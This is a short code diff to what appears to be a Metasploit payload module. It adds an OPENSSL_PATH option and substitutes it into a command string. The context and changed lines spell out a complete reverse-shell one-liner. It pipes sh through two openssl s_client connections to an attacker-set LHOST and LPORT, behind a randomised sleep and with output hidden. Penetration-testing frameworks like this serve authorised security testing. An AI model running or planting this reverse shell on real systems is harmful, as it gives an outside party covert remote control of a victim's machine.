@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('OPENSSL_PATH', [true ,'The path to OPENSSL', 'openssl'])
+    ])
   end
 
   #
@@ -45,9 +48,9 @@ module MetasploitModule
   def command_string
     cmd =
       "sh -c '(sleep #{3600+rand(1024)}|" +
-      "openssl s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
+      "#{datastore['OPENSSL_PATH']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
       "while : ; do sh && break; done 2>&1|" +
-      "openssl s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}" +
+      "#{datastore['OPENSSL_PATH']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}" +
       " >/dev/null 2>&1 &)'"
     return cmd
   end
